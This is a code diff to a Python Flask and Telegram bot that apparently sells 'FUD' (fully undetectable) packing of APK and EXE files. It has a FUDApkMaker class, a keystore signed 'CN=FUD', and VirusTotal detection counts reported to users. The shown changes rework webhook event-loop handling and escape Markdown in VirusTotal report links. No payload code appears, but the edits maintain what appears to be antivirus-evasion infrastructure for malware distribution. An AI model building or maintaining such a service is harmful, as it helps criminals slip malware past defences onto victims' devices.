@@ -18,7 +18,7 @@ from datetime import datetime, timedelta
 from flask import Flask, jsonify, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
-from telegram.error import BadRequest
+from telegram.error import BadRequest, NetworkError
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
@@ -45,7 +45,9 @@ DEVELOPER = "@benji_v1"
 # ============ FLASK ============
 app = Flask(__name__)
 start_time = time.time()
-application = None  # Will be set later
+application = None
+webhook_loop = asyncio.new_event_loop()
+asyncio.set_event_loop(webhook_loop)
 
 @app.route('/')
 def index():
@@ -57,25 +59,28 @@ def health():
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """Handle incoming Telegram updates via webhook"""
-    global application
+    global application, webhook_loop
     if application is None:
         return "Application not ready", 503
 
     try:
-        # Parse the update
         data = request.get_json(force=True)
         update = Update.de_json(data, application.bot)
-        
-        # Process asynchronously
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(application.process_update(update))
-        loop.close()
-        
+
+        future = asyncio.run_coroutine_threadsafe(
+            application.process_update(update),
+            webhook_loop
+        )
+        future.result(timeout=15)
+
         return "OK", 200
+    except asyncio.TimeoutError:
+        print("Webhook processing timed out")
+        return "Timeout", 504
     except Exception as e:
         print(f"Webhook error: {e}")
+        import traceback
+        traceback.print_exc()
         return f"Error: {e}", 500
 
 # ============ DATABASE ============
@@ -253,6 +258,17 @@ def ensure_keystore():
             "-keypass", KEYSTORE_PASS,
             "-dname", "CN=FUD, OU=Android, O=FUD, L=City, S=State, C=US"
         ], check=True, capture_output=True)
+
+# ============ ESCAPE MARKDOWN ============
+def escape_md(text):
+    """Escape Markdown special characters for Telegram messages"""
+    if not text:
+        return text
+    # Characters that need escaping in Markdown
+    chars = ['_', '*', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
+    for c in chars:
+        text = text.replace(c, f'\\{c}')
+    return text
 
 # ============ FUD ENGINE — APK ============
 class FUDApkMaker:
@@ -1033,7 +1049,8 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg += f"\nVirusTotal:\n"
         msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
-            msg += f"   View Report: {vt_result['link']}"
+            # ✅ FIX: Escape markdown characters in the link
+            msg += f"   View Report: {escape_md(vt_result['link'])}"
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -1121,7 +1138,8 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status_icon = "Clean" if vt_result['clean'] else "Detected"
         msg += f"\nVirusTotal: {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
-            msg += f"View Report: {vt_result['link']}"
+            # ✅ FIX: Escape markdown characters in the link
+            msg += f"View Report: {escape_md(vt_result['link'])}"
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -1259,9 +1277,9 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Cancelled. Send /start to begin.")
     return ConversationHandler.END
 
-# ============ BOT RUNNER — WEBHOOK MODE ============
+# ============ BOT RUNNER ============
 def run_bot():
-    global application
+    global application, webhook_loop
 
     async def bot_main():
         global application
@@ -1272,10 +1290,8 @@ def run_bot():
         print(f"Channel: {'Configured' if CHANNEL_ID else 'Not set'}")
         print(f"Admin ID: {ADMIN_CHAT_ID}")
 
-        # Build application
         application = Application.builder().token(BOT_TOKEN).build()
 
-        # Add handlers
         conv = ConversationHandler(
             entry_points=[
                 CommandHandler('start', start),
@@ -1297,11 +1313,9 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
-        # Initialize
         await application.initialize()
         await application.start()
 
-        # Set webhook
         if WEBHOOK_URL:
             webhook_full = f"{WEBHOOK_URL}"
             print(f"Setting webhook to: {webhook_full}")
@@ -1312,7 +1326,7 @@ def run_bot():
             )
             print("Webhook set successfully!")
         else:
-            print("WARNING: WEBHOOK_URL not set! Using polling (may cause conflicts)...")
+            print("WARNING: WEBHOOK_URL not set! Using polling...")
             await application.bot.delete_webhook(drop_pending_updates=True)
             await application.updater.start_polling(
                 drop_pending_updates=True,
@@ -1323,13 +1337,10 @@ def run_bot():
 
         print("Bot is running!")
 
-        # Keep alive
         while True:
             await asyncio.sleep(10)
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(bot_main())
+    webhook_loop.run_until_complete(bot_main())
 
 # ============ MAIN ============
 if __name__ == '__main__':
